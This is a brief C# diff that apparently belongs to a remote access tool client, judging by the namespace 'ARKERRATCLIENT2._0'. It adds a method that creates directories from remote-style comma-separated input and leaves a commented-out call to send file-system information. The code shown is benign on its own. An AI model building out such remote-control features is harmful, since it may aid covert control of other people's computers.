@@ -108,5 +108,12 @@ namespace ARKERRATCLIENT2._0
         {
             Process.Start(path);
         }
+
+        public static void CreateNewDirectory(string tempInfo)
+        {
+            string[] info = tempInfo.Split(',');
+            Directory.CreateDirectory(Path.Combine(info));
+            //SendFileSystem(info[0]);
+        }
     }
 }
